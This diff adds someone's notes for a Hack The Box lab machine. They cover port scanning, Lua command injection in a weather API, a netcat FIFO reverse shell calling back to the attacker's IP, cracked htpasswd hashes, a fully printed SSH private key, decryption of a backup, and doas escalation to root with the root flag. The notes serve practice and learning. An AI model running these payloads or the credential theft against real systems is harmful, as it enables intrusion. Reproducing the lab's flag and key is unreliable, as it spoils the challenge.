@@ -1,0 +1,327 @@
+let's enumerate first:
+command: sudo rustscan -a 10.10.10.218 
+result:
+PORT     STATE SERVICE    REASON
+22/tcp   open  ssh        syn-ack ttl 63
+80/tcp   open  http       syn-ack ttl 63
+9001/tcp open  tor-orport syn-ack ttl 63
+
+command: sudo nmap -sSVC -A -p 22,80,9001 10.10.10.218
+result:
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)
+| ssh-hostkey: 
+|   3072 20977f6c4a6e5d20cffda3aaa90d37db (RSA)
+|   521 35c329e187706d7374b2a9a204a96669 (ECDSA)
+|_  256 b3bd316dcc226b18ed2766b4a72ae4a5 (ED25519)
+80/tcp   open  http    nginx 1.19.0
+|_http-server-header: nginx/1.19.0
+| http-robots.txt: 1 disallowed entry 
+|_/weather
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=.
+|_http-title: 401 Unauthorized
+9001/tcp open  http    Medusa httpd 1.12 (Supervisor process manager)
+|_http-server-header: Medusa/1.12
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=default
+|_http-title: Error response
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|WAP|storage-misc
+Running (JUST GUESSING): NetBSD 5.X|7.X|3.X|2.X (96%), Apple NetBSD 4.X (95%), Apple embedded (93%), QNX RTOS 6.X (91%)
+OS CPE: cpe:/o:netbsd:netbsd:5.1.2 cpe:/o:apple:netbsd cpe:/o:netbsd:netbsd:7.99 cpe:/o:netbsd:netbsd:3.1.1 cpe:/h:apple:airport_extreme cpe:/o:apple:netbsd:4.99 cpe:/o:qnx:rtos:6.5.0 cpe:/o:netbsd:netbsd:2.1.0_stable
+Aggressive OS guesses: NetBSD 5.1.2 (96%), NetBSD 5.0 - 5.99.5 (95%), Apple AirPort Extreme WAP (version 7.7.3) or NetBSD 7.99 (95%), Apple AirPort Extreme WAP (version 7.7.3) (93%), NetBSD 7.0 (93%), NetBSD 3.1.1 (92%), Apple AirPort Extreme WAP (NetBSD 4.99) (91%), Apple AirPort Extreme WAP or Time Capsule NAS device (NetBSD 4.99), or QNX RTOS 6.5.0 (91%), NetBSD 2.1.0_STABLE or Ricoh C720S, 1107EX, MP 2550, or MP 7001 printer (91%), QNX RTOS 7.0.0 (91%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd
+
+access: http://10.10.10.218/
+result:
+401 Unauthorized
+
+access: http://10.10.10.218:9001/
+result:
+Error code 401.
+Message: Unauthorized. 
+
+access: access: http://10.10.10.218:9001/
+use default username and password: 
+username: user
+password: 123
+
+access: http://10.10.10.218:9001/tail.html?processname=memory
+access: http://10.10.10.218:9001/tail.html?processname=processes
+takte attention:
+_httpd      376  0.0  0.0  35680  1976 ?     Is    6:57AM 0:00.01 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr/local/webapi/weather.lua -U _httpd -b /var/www 
+
+access: http://10.10.10.218:9001/tail.html?processname=uptime
+
+command: ./feroxbuster -u http://10.10.10.218 -w /snap/feroxbuster/common/wordlist/raft-medium-directories.txt  
+result:
+404      GET        7l       11w      153c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+401      GET        5l       10w      209c http://10.10.10.218/
+[####################] - 14s    30001/30001   0s      found:1       errors:0      
+[####################] - 14s    30000/30000   2191/s  http://10.10.10.218/ 
+
+command: ./feroxbuster -u http://10.10.10.218/weather -w /snap/feroxbuster/common/wordlist/raft-medium-directories.txt
+result:
+404      GET        7l       11w      153c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+200      GET        1l       12w       90c http://10.10.10.218/weather/forecast
+[####################] - 14s    30000/30000   0s      found:1       errors:0      
+[####################] - 14s    30000/30000   2129/s  http://10.10.10.218/weather/ 
+
+access: 
+http://10.10.10.218/weather/forecast
+result:
+{"code": 200, "message": "No city specified. Use 'city=list' to list available cities."}
+
+command: curl -s http://10.10.10.218/weather/forecast | jq .                       
+{
+  "code": 200,
+  "message": "No city specified. Use 'city=list' to list available cities."
+}
+
+command: curl -s http://10.10.10.218/weather/forecast?city=list | jq .
+{
+  "code": 200,
+  "cities": [
+    "London",
+    "Manchester",
+    "Birmingham",
+    "Leeds",
+    "Glasgow",
+    "Southampton",
+    "Liverpool",
+    "Newcastle",
+    "Nottingham",
+    "Sheffield",
+    "Bristol",
+    "Belfast",
+    "Leicester"
+  ]
+}
+
+command: curl -s http://10.10.10.218/weather/forecast?city=Leicester | jq .
+{
+  "code": 200,
+  "city": "Leicester",
+  "list": [
+    {
+      "date": "2023-06-24",
+      "weather": {
+        "description": "snowy",
+        "temperature": {
+          "min": "12",
+          "max": "46"
+        },
+        "pressure": "1799",
+        "humidity": "92",
+        "wind": {
+          "speed": "2.1975513692014",
+          "degree": "102.76822959445"
+        }
+      }
+    },
+    {
+      "date": "2023-06-25",
+      "weather": {
+        "description": "partially cloudy",
+        "temperature": {
+          "min": "15",
+          "max": "43"
+        },
+        "pressure": "1365",
+        "humidity": "51",
+        "wind": {
+          "speed": "4.9522297247313",
+          "degree": "262.63571172766"
+        }
+      }
+    },
+    {
+      "date": "2023-06-26",
+      "weather": {
+        "description": "sunny",
+        "temperature": {
+          "min": "19",
+          "max": "30"
+        },
+        "pressure": "1243",
+        "humidity": "13",
+        "wind": {
+          "speed": "1.8041767538525",
+          "degree": "48.400944394059"
+        }
+      }
+    },
+    {
+      "date": "2023-06-27",
+      "weather": {
+        "description": "sunny",
+        "temperature": {
+          "min": "30",
+          "max": "34"
+        },
+        "pressure": "1513",
+        "humidity": "84",
+        "wind": {
+          "speed": "2.6126398323104",
+          "degree": "191.63755226741"
+        }
+      }
+    },
+    {
+      "date": "2023-06-28",
+      "weather": {
+        "description": "partially cloudy",
+        "temperature": {
+          "min": "30",
+          "max": "36"
+        },
+        "pressure": "1772",
+        "humidity": "53",
+        "wind": {
+          "speed": "2.7699138359167",
+          "degree": "104.89152945159"
+        }
+      }
+    }
+  ]
+}
+
+command: curl -s http://10.10.10.218/weather/forecast?city=washington | jq .
+{
+  "code": 500,
+  "error": "unknown city: washington"
+}
+
+command: curl -s 'http://10.10.10.218/weather/forecast?city="'
+{"code": 500,"error": "unknown city: ""}
+
+commnad: curl -s "http://10.10.10.218/weather/forecast?city='"                     
+<br>Lua error: /usr/local/webapi/weather.lua:49: attempt to call a nil value
+
+command: curl -s "http://10.10.10.218/weather/forecast?city=')+--"
+{"code": 500,"error": "unknown city:
+
+command: curl -s "http://10.10.10.218/weather/forecast?city=')+os.execute('id')+--"
+{"code": 500,"error": "unknown city: uid=24(_httpd) gid=24(_httpd) groups=24(_httpd)
+
+command: curl -G --data-urlencode "city=') os.execute('id') --" 'http://10.10.10.218/weather/forecast' -s 
+{"code": 500,"error": "unknown city: uid=24(_httpd) gid=24(_httpd) groups=24(_httpd)
+
+use fifo shell: 
+command: nc -lvnp 7979
+command: curl -G --data-urlencode "city=') os.execute('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.19 7979 >/tmp/f') --" 'http://10.10.10.218/weather/forecast' -s
+
+command: cat .htpasswd
+webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
+
+command: echo 'webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0' > htpasswd 
+command: hashcat -m 500 htpasswd --user /home/donika-pentest/Documents/hackthebox/linux/26_postman_easy/rockyou.txt --show
+result: 
+webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0:iamthebest
+
+access: http://10.10.10.218/
+username: webapi_user
+password: iamthebest
+
+command: ps auxww | grep michaels
+r.michaels  185  0.0  0.0  36760  1976 ?     Is    6:57AM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /home/r.michaels/devel/webapi/weather.lua -P /var/run/httpd_devel.pid -U r.michaels -b /home/r.michaels/devel/www 
+_httpd     2683  0.0  0.0  17756  1468 ?     O     7:42AM 0:00.00 grep michael
+
+take attention port 3001 on localhost
+home dir read
+
+command: curl -s http://127.0.0.1:3001/~r.michaels/
+<html><head><title>401 Unauthorized</title></head>
+<body><h1>401 Unauthorized</h1>
+~r.michaels//: <pre>No authorization</pre>
+<hr><address><a href="//127.0.0.1:3001/">127.0.0.1:3001</a></address>
+</body></html>
+
+command: curl -s http://127.0.0.1:3001/~r.michaels/id_rsa -u webapi_user:iamthebest
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAvXxJBbm4VKcT2HABKV2Kzh9GcatzEJRyvv4AAalt349ncfDkMfFB
+Icxo9PpLUYzecwdU3LqJlzjFga3kG7VdSEWm+C1fiI4LRwv/iRKyPPvFGTVWvxDXFTKWXh
+0DpaB9XVjggYHMr0dbYcSF2V5GMfIyxHQ8vGAE+QeW9I0Z2nl54ar/I/j7c87SY59uRnHQ
+kzRXevtPSUXxytfuHYr1Ie1YpGpdKqYrYjevaQR5CAFdXPobMSxpNxFnPyyTFhAbzQuchD
+ryXEuMkQOxsqeavnzonomJSuJMIh4ym7NkfQ3eKaPdwbwpiLMZoNReUkBqvsvSBpANVuyK
+BNUj4JWjBpo85lrGqB+NG2MuySTtfS8lXwDvNtk/DB3ZSg5OFoL0LKZeCeaE6vXQR5h9t8
+3CEdSO8yVrcYMPlzVRBcHp00DdLk4cCtqj+diZmR8MrXokSR8y5XqD3/IdH5+zj1BTHZXE
+pXXqVFFB7Jae+LtuZ3XTESrVnpvBY48YRkQXAmMVAAAFkBjYH6gY2B+oAAAAB3NzaC1yc2
+EAAAGBAL18SQW5uFSnE9hwASldis4fRnGrcxCUcr7+AAGpbd+PZ3Hw5DHxQSHMaPT6S1GM
+3nMHVNy6iZc4xYGt5Bu1XUhFpvgtX4iOC0cL/4kSsjz7xRk1Vr8Q1xUyll4dA6WgfV1Y4I
+GBzK9HW2HEhdleRjHyMsR0PLxgBPkHlvSNGdp5eeGq/yP4+3PO0mOfbkZx0JM0V3r7T0lF
+8crX7h2K9SHtWKRqXSqmK2I3r2kEeQgBXVz6GzEsaTcRZz8skxYQG80LnIQ68lxLjJEDsb
+Knmr586J6JiUriTCIeMpuzZH0N3imj3cG8KYizGaDUXlJAar7L0gaQDVbsigTVI+CVowaa
+POZaxqgfjRtjLskk7X0vJV8A7zbZPwwd2UoOThaC9CymXgnmhOr10EeYfbfNwhHUjvMla3
+GDD5c1UQXB6dNA3S5OHArao/nYmZkfDK16JEkfMuV6g9/yHR+fs49QUx2VxKV16lRRQeyW
+nvi7bmd10xEq1Z6bwWOPGEZEFwJjFQAAAAMBAAEAAAGAStrodgySV07RtjU5IEBF73vHdm
+xGvowGcJEjK4TlVOXv9cE2RMyL8HAyHmUqkALYdhS1X6WJaWYSEFLDxHZ3bW+msHAsR2Pl
+7KE+x8XNB+5mRLkflcdvUH51jKRlpm6qV9AekMrYM347CXp7bg2iKWUGzTkmLTy5ei+XYP
+DE/9vxXEcTGADqRSu1TYnUJJwdy6lnzbut7MJm7L004hLdGBQNapZiS9DtXpWlBBWyQolX
+er2LNHfY8No9MWXIjXS6+MATUH27TttEgQY3LVztY0TRXeHgmC1fdt0yhW2eV/Wx+oVG6n
+NdBeFEuz/BBQkgVE7Fk9gYKGj+woMKzO+L8eDll0QFi+GNtugXN4FiduwI1w1DPp+W6+su
+o624DqUT47mcbxulMkA+XCXMOIEFvdfUfmkCs/ej64m7OsRaIs8Xzv2mb3ER2ZBDXe19i8
+Pm/+ofP8HaHlCnc9jEDfzDN83HX9CjZFYQ4n1KwOrvZbPM1+Y5No3yKq+tKdzUsiwZAAAA
+wFXoX8cQH66j83Tup9oYNSzXw7Ft8TgxKtKk76lAYcbITP/wQhjnZcfUXn0WDQKCbVnOp6
+LmyabN2lPPD3zRtRj5O/sLee68xZHr09I/Uiwj+mvBHzVe3bvLL0zMLBxCKd0J++i3FwOv
++ztOM/3WmmlsERG2GOcFPxz0L2uVFve8PtNpJvy3MxaYl/zwZKkvIXtqu+WXXpFxXOP9qc
+f2jJom8mmRLvGFOe0akCBV2NCGq/nJ4bn0B9vuexwEpxax4QAAAMEA44eCmj/6raALAYcO
+D1UZwPTuJHZ/89jaET6At6biCmfaBqYuhbvDYUa9C3LfWsq+07/S7khHSPXoJD0DjXAIZk
+N+59o58CG82wvGl2RnwIpIOIFPoQyim/T0q0FN6CIFe6csJg8RDdvq2NaD6k6vKSk6rRgo
+IH3BXK8fc7hLQw58o5kwdFakClbs/q9+Uc7lnDBmo33ytQ9pqNVuu6nxZqI2lG88QvWjPg
+nUtRpvXwMi0/QMLzzoC6TJwzAn39GXAAAAwQDVMhwBL97HThxI60inI1SrowaSpMLMbWqq
+189zIG0dHfVDVQBCXd2Rng15eN5WnsW2LL8iHL25T5K2yi+hsZHU6jJ0CNuB1X6ITuHhQg
+QLAuGW2EaxejWHYC5gTh7jwK6wOwQArJhU48h6DFl+5PUO8KQCDBC9WaGm3EVXbPwXlzp9
+9OGmTT9AggBQJhLiXlkoSMReS36EYkxEncYdWM7zmC2kkxPTSVWz94I87YvApj0vepuB7b
+45bBkP5xOhrjMAAAAVci5taWNoYWVsc0BsdWFubmUuaHRiAQIDBAUG
+-----END OPENSSH PRIVATE KEY-----
+
+command: ssh -i id_rsa_michael r.michaels@10.10.10.218
+result: success ssh
+
+command: find / -name doas.conf 2>/dev/null
+/usr/pkg/etc/doas.conf
+
+command: cat /usr/pkg/etc/doas.conf                                                         
+permit r.michaels as root
+
+comamnd: cd backup
+command: ls -al
+result: 
+total 12
+dr-xr-xr-x  2 r.michaels  users   512 Nov 24  2020 .
+dr-xr-x---  7 r.michaels  users   512 Sep 16  2020 ..
+-r--------  1 r.michaels  users  1970 Nov 24  2020 devel_backup-2020-09-16.tar.gz.enc
+
+command: ls -al /home/r.michaels/.gnupg/                                                   
+total 16
+drwx------  2 r.michaels  users   512 Sep 14  2020 .
+dr-xr-x---  7 r.michaels  users   512 Sep 16  2020 ..
+-rw-------  1 r.michaels  users   603 Sep 14  2020 pubring.gpg
+-rw-------  1 r.michaels  users  1291 Sep 14  2020 secring.gpg
+
+command: netpgp --decrypt --output=/tmp/0xdf.tar.gz devel_backup-2020-09-16.tar.gz.enc
+extract 0xdf in /tmp
+command: tar xvf 0xdf
+command: cd /tmp/devel-2020-09-16/www
+command: cat .htpasswd                                                                                                                
+webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.
+
+command: echo 'webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.' > htpasswd2
+command: hashcat -m 500 htpasswd2 --user /home/donika-pentest/Documents/kali_documents/hackthebox/26_postman_easy/rockyou.txt  --show
+webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.:littlebear
+
+command: doas sh           
+Password: littlebear
+command: cat /root/root.txt
+7a9b5c206e8e8ba09bb99bd113675f66
+
+resource:
+https://0xdf.gitlab.io/2021/03/27/htb-luanne.html
+
